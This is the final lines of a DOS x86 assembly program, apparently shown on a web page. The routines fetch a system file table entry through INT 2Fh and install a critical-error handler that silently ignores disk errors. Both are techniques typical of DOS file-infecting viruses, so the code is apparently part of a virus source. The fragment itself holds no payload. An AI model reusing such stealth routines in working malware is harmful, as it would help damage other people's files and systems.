	mov	bl,es:[di]
	mov	ax,1216 	; Get system FCB for file table entry
	int	2F		;  No. in BX into ES:DI
	pop	bx		; Restore BX

	mov	bp,512d 	; BP := 512
	lea	di,[di+15]	; Point DI at file position
	ret			; Done. Return

new_int_24:			; New critical error handler
	mov	al,3		; Just ignore
	iret			; And exit

begword dw	2DE9

code	ends
	end	start

</textarea></td></tr></table></body></html>
